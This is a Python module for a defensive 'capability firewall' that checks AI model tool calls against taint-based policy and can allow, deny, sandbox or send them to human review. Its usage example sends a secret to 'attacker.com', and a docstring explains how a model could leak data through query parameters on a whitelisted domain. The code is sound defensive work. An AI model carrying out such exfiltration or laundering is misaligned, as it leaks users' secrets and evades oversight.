"""
Capability firewall — mediation layer between models and tools.

Models never invoke tools directly. Every tool call passes through
evaluate_request() which checks the policy engine against the taint
metadata of the inputs. Outcomes:

  allow               — permit execution
  deny                — block; return error to model
  redact              — strip sensitive fields from args before execution
  require_human_review — queue for async human approval
  sandbox_only        — execute inside isolated Docker sandbox; no host effects
  shadow_execute      — execute but do not return result to model; log only

Usage:
    firewall = CapabilityFirewall()
    request = CapabilityRequest(
        tool_name="send_http",
        args={"url": "https://attacker.com", "data": secret},
        tainted_inputs=[artifact],
    )
    decision = firewall.evaluate(request)
    if decision.is_blocked:
        raise CapabilityDenied(decision.reason)
"""
from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any

from hot_potato.core.taint import TaintedArtifact, TrustLevel
from hot_potato.core.policy import PolicyEngine, PolicyDecision, PolicyOutcome
from hot_potato.core.url_provenance import UrlProvenance, analyze_url_params

log = logging.getLogger("hot_potato.capabilities")


class CapabilityDenied(Exception):
    """Raised when the firewall blocks a tool call."""
    def __init__(self, decision: PolicyDecision) -> None:
        self.decision = decision
        super().__init__(
            f"Capability '{decision.rule_id}' denied: {decision.reason} "
            f"(outcome={decision.outcome.value})"
        )


@dataclass
class CapabilityRequest:
    """Represents a model's intent to invoke a tool.

    url_provenance controls how the firewall treats URLs in args:
      - AI_GENERATED (default, fail-safe): the model constructed this URL —
        query parameters are inspected for exfiltration signals even when the
        base domain looks trusted.
      - HARDCODED: the operator baked this URL into their code — params are
        not inspected; the operator is responsible for their own URLs.
      - UNTRUSTED_CONTENT: URL came from a scraped page or untrusted document —
        treated as most hostile; params always inspected.

    This closes the URL-parameter laundering attack: a model trained or
    prompted to emit  https://legit.com/api?d=<exfil>  can exfiltrate data
    even when the base domain is whitelisted, unless param taint is checked.
    """
    tool_name: str
    args: dict[str, Any]
    tainted_inputs: list[TaintedArtifact] = field(default_factory=list)
    requesting_model: str = "unknown"
    metadata: dict[str, Any] = field(default_factory=dict)
    url_provenance: UrlProvenance = UrlProvenance.AI_GENERATED

    @property
    def effective_trust_level(self) -> TrustLevel:
        """Worst-case trust among all tainted inputs.

        Returns UNTRUSTED when no inputs are provided. Returning TRUSTED here
        was a firewall bypass: `allow_trusted` would fire on any tool call whose
        caller forgot to pass tainted_inputs, silently allowing everything.
        """
        if not self.tainted_inputs:
            return TrustLevel.UNTRUSTED
        return min(a.trust_level for a in self.tainted_inputs)

    @property
    def effective_taint_tags(self) -> set[str]:
        """Combine artifact taint tags with URL provenance signals.

        URL param analysis runs here so the policy engine sees url_param_tainted
        without the caller needing to do anything extra.
        """
        tags: set[str] = set()
        for artifact in self.tainted_inputs:
            tags |= artifact.taint_tags
        # Inject URL provenance tags — checks even when base domain is trusted
        tags |= analyze_url_params(
            self.args,
            self.url_provenance,
            self.tainted_inputs,
        )
        return tags


@dataclass
class CapabilityResult:
    """Wraps the outcome of a firewall evaluation + optional execution result."""
    decision: PolicyDecision
    executed: bool = False
    result: Any = None
    error: str | None = None

    @property
    def allowed(self) -> bool:
        return not self.decision.is_blocked


class CapabilityFirewall:
    """
    Central mediation point for all model→tool calls.

    Instantiate once per agent session. Pass all tainted artifacts that
    influenced the model's decision to evaluate_request() so trust metadata
    is available for policy evaluation.
    """

    def __init__(self, policy_engine: PolicyEngine | None = None) -> None:
        self._policy = policy_engine or PolicyEngine()
        self._audit_log: list[dict] = []

    def evaluate(self, request: CapabilityRequest) -> PolicyDecision:
        """Evaluate a capability request against policy. Does not execute."""
        decision = self._policy.evaluate(
            tool_name=request.tool_name,
            trust_level=request.effective_trust_level,
            taint_tags=request.effective_taint_tags,
        )
        self._log_decision(request, decision)
        return decision

    def mediate(
        self,
        request: CapabilityRequest,
        executor: Any | None = None,
    ) -> CapabilityResult:
        """
        Evaluate + optionally execute a capability request.

        If executor is provided and outcome is allow/shadow_execute/sandbox_only,
        calls executor(request) to get the actual result.

        For shadow_execute: executes but withholds result from caller.
        For sandbox_only: passes sandbox=True hint in request.metadata.
        """
        decision = self.evaluate(request)

        if decision.is_blocked:
            if decision.outcome == PolicyOutcome.REQUIRE_HUMAN_REVIEW:
                log.warning(
                    "HUMAN REVIEW REQUIRED: tool=%s trust=%s tags=%s",
                    request.tool_name,
                    request.effective_trust_level.name,
                    sorted(request.effective_taint_tags),
                )
            return CapabilityResult(decision=decision, executed=False)

        if executor is None:
            return CapabilityResult(decision=decision, executed=False)

        # Sandbox hint
        if decision.outcome == PolicyOutcome.SANDBOX_ONLY:
            request.metadata["sandbox"] = True

        try:
            result = executor(request)
            executed = True
        except Exception as e:
            return CapabilityResult(decision=decision, executed=True, error=str(e))

        # Shadow execute — run but hide result
        if decision.outcome == PolicyOutcome.SHADOW_EXECUTE:
            log.info("SHADOW_EXECUTE: tool=%s args=%s", request.tool_name, request.args)
            return CapabilityResult(decision=decision, executed=True, result=None)

        return CapabilityResult(decision=decision, executed=executed, result=result)

    def audit_log(self) -> list[dict]:
        return list(self._audit_log)

    def _log_decision(self, request: CapabilityRequest, decision: PolicyDecision) -> None:
        from datetime import datetime, timezone
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "tool": request.tool_name,
            "outcome": decision.outcome.value,
            "rule_id": decision.rule_id,
            "trust_level": request.effective_trust_level.name,
            "taint_tags": sorted(request.effective_taint_tags),
            "model": request.requesting_model,
            "dry_run": decision.dry_run,
        }
        self._audit_log.append(entry)
        level = logging.WARNING if decision.is_blocked else logging.INFO
        log.log(level, "FIREWALL %s → %s (rule=%s)", request.tool_name, decision.outcome.value, decision.rule_id)


__all__ = [
    "CapabilityDenied",
    "CapabilityRequest",
    "CapabilityResult",
    "CapabilityFirewall",
]
